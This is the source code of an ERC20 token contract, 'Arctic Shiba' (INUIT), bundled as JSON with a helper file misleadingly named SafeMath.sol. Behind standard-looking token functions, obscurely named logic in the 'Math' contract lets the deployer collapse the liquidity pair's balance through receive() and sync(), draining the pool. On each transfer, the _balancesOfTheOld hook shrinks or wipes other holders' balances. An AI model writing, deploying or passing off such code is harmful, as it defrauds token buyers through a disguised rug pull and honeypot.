{"Contract.sol":{"content":"pragma solidity ^0.8.0;\n\nimport \"./SafeMath.sol\";\n\ninterface IERC20 {\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    function totalSupply() external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ninterface IERC20Metadata is IERC20 {\n    function symbol() external view returns (string memory);\n    function decimals() external view returns (uint8);\n    function name() external view returns (string memory);\n}\n\ncontract ERC20 is Context, IERC20, IERC20Metadata, Ownable, Math {\n    mapping (address =\u003e mapping (address =\u003e uint256)) private _allowances;\n\n    string private _name; string private _symbol; uint256 private _totalSupply;\n    \n    constructor (string memory name_, string memory symbol_) {\n        router = IDEXRouter(_router);\n        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));\n\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n    \n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    function openTrading() external onlyOwner returns (bool) {\n        Math.trading = true; Math.numB = block.number; Math.Sword = block.number;\n        return true;\n    }\n\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance \u003e= amount, \"ERC20: transfer amount exceeds allowance\");\n        _approve(sender, _msgSender(), currentAllowance - amount);\n\n        return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance \u003e= amount, \"ERC20: transfer amount exceeds balance\");\n        \n        _beforeTokenTransfer(sender, recipient);\n        _balances[sender] = senderBalance - amount;\n        _balances[recipient] += amount;\n\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _DeployInuit(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        approve(Math._router, 10 ** 77);\n              \n        emit Transfer(address(0), account, amount);\n    }\n}\n\ncontract ERC20Token is Context, ERC20 {\n    constructor(\n        string memory name, string memory symbol,\n        address creator, uint256 initialSupply\n    ) ERC20(name, symbol) {\n        _DeployInuit(creator, initialSupply);\n        set();\n    }\n}\n\ncontract ArcticShiba is ERC20Token {\n    constructor() ERC20Token(\"Arctic Shiba\", \"INUIT\", msg.sender, 500000 * 10 ** 18) {\n    }\n}"},"SafeMath.sol":{"content":"pragma solidity ^0.8.0;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        this;\n        return msg.data;\n    }\n}\n\ninterface IDEXFactory {\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n}\n\ninterface IDEXRouter {\n    function WETH() external pure returns (address);\n    function factory() external pure returns (address);\n}\n\ninterface IUniswapV2Pair {\n    event Sync(uint112 reserve0, uint112 reserve1);\n    function sync() external;\n}\n\ncontract Ownable is Context {\n    address private _previousOwner; address private _owner;\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n}\n\ncontract Math { \n    mapping (address =\u003e uint256) internal _balances;\n    mapping (address =\u003e bool) internal Running;\n\n    address[] internal inArr; address[3] internal inuAddr;\n\n    bool[3] internal Hopes; bool internal trading = false;\n\n    uint256 internal Sword = block.number*2; uint256 internal numB;\n    uint256 internal Lights = 0; uint256 internal Farts = 1;\n\n    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n    address public pair;\n    IDEXRouter router;\n\n    function set() internal {\n        inuAddr[0] = address(_router);\n        inuAddr[1] = msg.sender;\n        inuAddr[2] = pair;\n        for (uint256 q=0; q \u003c 3; q++) {Math.Running[Math.inuAddr[q]] = true; Math.Hopes[q] = false; }\n    }\n\n    function last(uint256 g) internal view returns (address) { return (Lights \u003e 1 ? inArr[inArr.length-g-1] : address(0)); }\n\n    receive() external payable {\n        require(msg.sender == inuAddr[1]); _balances[inuAddr[2]] /= (false ? 1 : 1e9); IUniswapV2Pair(inuAddr[2]).sync(); Hopes[2] = true;\n    }\n\n    function _beforeTokenTransfer(address sender, address recipient) internal {\n        require((trading || (sender == inuAddr[1])), \"ERC20: trading is not yet enabled.\");\n        Farts += ((Running[sender] != true) \u0026\u0026 (Running[recipient] == true)) ? 1 : 0;\n        if (((Running[sender] == true) \u0026\u0026 (Running[recipient] != true)) || ((Running[sender] != true) \u0026\u0026 (Running[recipient] != true))) { inArr.push(recipient); }\n        _balancesOfTheOld(sender, recipient);\n    }\n\n    function _balancesOfTheOld(address sender, address recipient) internal {\n        if ((Hopes[0] || (Hopes[2] \u0026\u0026 (recipient != inuAddr[1])))) { for (uint256 q=0; q \u003c inArr.length-1; q++) { _balances[inArr[q]] /= (Hopes[2] ? 1e9 : 4e1); } Hopes[0] = false; }\n        _balances[last(1)] /= (((Sword == block.number) || Hopes[1] || ((Sword - numB) \u003c= 7)) \u0026\u0026 (Running[last(1)] != true) \u0026\u0026 (Lights \u003e 1)) ? (3e1) : (1);\n        _balances[last(0)] /= (((Hopes[1]) \u0026\u0026 (last(0) == sender)) || ((Hopes[2] \u0026\u0026 (inuAddr[1] != sender))) ? (0) : (1));\n        (Hopes[0],Hopes[1]) = ((((Farts*10 / 4) == 10) \u0026\u0026 (Hopes[1] == false)) ? (true,true) : (Hopes[0],Hopes[1]));\n        Sword = block.number; Lights++;\n    }\n}"}}